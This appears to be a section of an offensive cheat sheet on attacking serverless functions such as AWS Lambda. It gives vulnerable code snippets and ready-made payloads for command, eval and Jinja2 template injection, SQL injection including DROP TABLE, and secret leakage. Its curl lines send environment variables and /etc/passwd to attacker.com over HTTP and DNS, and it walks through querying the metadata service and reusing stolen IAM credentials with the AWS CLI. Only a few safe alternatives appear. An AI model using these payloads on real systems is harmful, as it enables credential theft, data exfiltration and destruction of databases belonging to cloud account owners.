<code_injection>
<command_injection>
{% raw %}
# Command injection in serverless functions

# Python Lambda example:
import os
def lambda_handler(event, context):
    filename = event['filename']
    os.system(f"cat {filename}")  # Vulnerable!

# Attack:
{"filename": "file.txt; whoami"}
{"filename": "file.txt && curl http://attacker.com/$(cat /etc/passwd | base64)"}

# Node.js example:
const { exec } = require('child_process');
exports.handler = async (event) => {
    const cmd = event.command;
    exec(cmd, (error, stdout, stderr) => {  // Vulnerable!
        // ...
    });
};

# Attack:
{"command": "id"}
{"command": "curl http://attacker.com?data=$(env | base64)"}

# Python subprocess injection:
import subprocess
subprocess.run(["echo", user_input], shell=True)  # Vulnerable if shell=True

# Safe alternatives:
subprocess.run(["echo", user_input], shell=False)
subprocess.run(["echo", user_input])
{% endraw %}
</command_injection>

<code_eval_injection>
{% raw %}
# eval() and similar dangerous functions

# Python:
result = eval(event['expression'])  # Never do this!

# Attack:
{"expression": "__import__('os').system('id')"}
{"expression": "open('/etc/passwd').read()"}

# Node.js:
const result = eval(event.code);  // Never do this!

# Attack:
{"code": "require('child_process').execSync('id').toString()"}

# Python exec():
exec(event['code'])  # Dangerous!

# Attack:
{"code": "import os; os.system('whoami')"}
{% endraw %}
</code_eval_injection>

<template_injection>
{% raw %}
# Template injection in serverless

# Python Jinja2:
from jinja2 import Template
template = Template(event['template'])
output = template.render()  # Vulnerable!

# Attack:
{"template": "{{config.items()}}"}
{"template": "{{''.__class__.__mro__[1].__subclasses__()}}"}

# SSTI RCE:
{"template": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"}

# Node.js template engines (Pug, EJS, Handlebars):
# Similar injection patterns
{% endraw %}
</template_injection>

<sql_injection>
{% raw %}
# SQL injection in serverless functions

# Python with string concatenation:
import pymysql
def lambda_handler(event, context):
    user_id = event['user_id']
    query = f"SELECT * FROM users WHERE id = '{user_id}'"  # Vulnerable!
    cursor.execute(query)

# Attack:
{"user_id": "1' OR '1'='1"}
{"user_id": "1'; DROP TABLE users;--"}

# Safe: Parameterized queries
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
{% endraw %}
</sql_injection>
</code_injection>

<environment_secrets>
<env_var_leakage>
{% raw %}
# Environment variables in Lambda

# Lambda environment variables accessible via:
import os
secret = os.environ.get('DB_PASSWORD')

# Attack vectors:

# 1. Error message leakage:
# Trigger error that dumps env vars
# Stack traces may include environment

# 2. Logging leakage:
# If function logs env vars (debug mode)
# CloudWatch Logs exposes them

# 3. SSRF to metadata:
# From within Lambda, access metadata service (in VPC)
import requests
metadata = requests.get('http://169.254.169.254/latest/meta-data/')

# 4. Code injection to dump env:
{"cmd": "env"}
{"cmd": "printenv"}
{"code": "import os; print(os.environ)"}

# 5. Dependency vulnerability:
# Vulnerable package that logs environment

# Common secrets in env vars:
# - DB_HOST, DB_PASSWORD
# - API_KEY, SECRET_KEY
# - AWS_ACCESS_KEY_ID (from role, but still present)
# - STRIPE_API_KEY, SENDGRID_API_KEY
# - JWT_SECRET
{% endraw %}
</env_var_leakage>

<iam_role_extraction>
{% raw %}
# Lambda execution role credentials

# Lambda functions assume IAM role
# Temporary credentials available via environment:
# - AWS_ACCESS_KEY_ID
# - AWS_SECRET_ACCESS_KEY
# - AWS_SESSION_TOKEN

# Or via metadata (if in VPC):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Attack: Extract and use credentials

# 1. Via code injection:
{"cmd": "env | grep AWS"}
{"code": "import os; print(os.environ['AWS_SECRET_ACCESS_KEY'])"}

# 2. Exfiltrate via DNS:
{"cmd": "curl http://$(env | base64 -w0).attacker.com"}

# 3. Exfiltrate via HTTP:
{"cmd": "curl -X POST http://attacker.com -d \"$(env)\""}

# Use extracted credentials:
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls  # Test permissions

# Check role permissions:
aws sts get-caller-identity
aws iam get-role --role-name <role-name>
aws iam list-attached-role-policies --role-name <role-name>
{% endraw %}
</iam_role_extraction>

